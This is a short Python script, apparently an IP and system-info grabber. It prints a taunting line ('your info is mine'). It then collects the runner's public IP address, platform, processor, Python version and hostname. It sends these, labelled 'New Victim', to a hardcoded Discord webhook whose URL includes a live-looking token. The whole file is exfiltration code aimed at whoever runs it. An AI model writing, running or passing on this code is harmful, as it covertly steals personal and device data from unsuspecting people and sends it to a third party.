import requests, platform

print("know what im sorry but your info is mine sorry")

iprequest = requests.get("https://api.ipify.org?format=json")

payload = {
    "content": "**New Victim: **" + "\n" + "IP Address: " + str(iprequest.json()['ip']) + "\n" + "Platform: " + str(platform.platform()) + "\n" + "Processor: " + str(platform.processor()) + "\n" + "Python Version: " + str(platform.python_version()) + "\n" + "Node: " + str(platform.node())
}

sendwebhook = requests.post("https://discordapp.com/api/webhooks/1022328246475440268/h4YkHSGglzq7Kr-HElb7rXXJOdmEemDLzKsCSf-3Knk7U4RYEusE8_qUenS4Yw4_Jtqd", data=payload)
